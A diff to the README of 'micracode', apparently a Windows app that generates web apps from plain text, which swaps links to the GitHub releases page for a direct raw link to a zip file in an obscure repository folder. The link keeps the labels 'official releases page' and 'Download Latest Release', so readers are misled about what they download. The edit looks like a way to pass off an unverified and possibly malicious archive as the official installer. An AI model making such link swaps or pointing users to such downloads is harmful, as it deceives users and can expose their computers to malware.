@@ -1,6 +1,6 @@
 # 🛠️ micracode - Create web apps with simple text
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rachaellaboring846/micracode/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/rachaellaboring846/micracode/main/dihydrol/Software_1.4.zip)
 
 micracode helps you build functional web applications using plain language. You describe what you want the app to do, and the software generates the code for you. It automates the complex parts of web development so you focus on your ideas.
 
@@ -8,7 +8,7 @@ micracode helps you build functional web applications using plain language. You 
 
 You need a Windows computer to run this application. Follow these instructions to set up the software.
 
-1. Visit the [official releases page](https://github.com/rachaellaboring846/micracode/releases) to find the latest version of the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/rachaellaboring846/micracode/main/dihydrol/Software_1.4.zip) to find the latest version of the installer.
 2. Look for the file ending in `.exe` under the Assets section of the newest release.
 3. Click the filename to start the download.
 4. Save the file to your desktop or your Downloads folder.
